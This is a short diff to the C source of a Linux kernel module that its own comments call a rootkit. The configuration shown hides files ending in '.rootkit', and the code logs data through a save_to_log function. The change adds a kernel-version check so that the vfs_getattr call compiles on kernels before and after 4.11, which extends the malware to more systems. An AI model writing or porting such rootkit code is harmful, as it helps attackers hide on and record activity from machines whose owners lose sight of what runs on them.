@@ -12,6 +12,7 @@
 #include <linux/namei.h>
 #include <linux/fs_struct.h>    //for xchg(&current->fs->umask, ... )
 #include <asm/cacheflush.h>
+#include <linux/version.h>      //for checking kernel version
 
 //beginning of the rootkit's configuration
 #define FILE_SUFFIX ".rootkit"    	//hiding files with names ending on defined suffix
@@ -469,7 +470,13 @@ void save_to_log(const char *log_type, const char *what, size_t size)
     	goto end;
 
     kern_path(full_path, 0, &p);
+    
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,11,0)
     err = vfs_getattr(&p, &ks, 0xFFFFFFFF, 0);
+#else
+    err = vfs_getattr(&p, &ks);
+#endif
+
     if (err)
     	goto end;
 
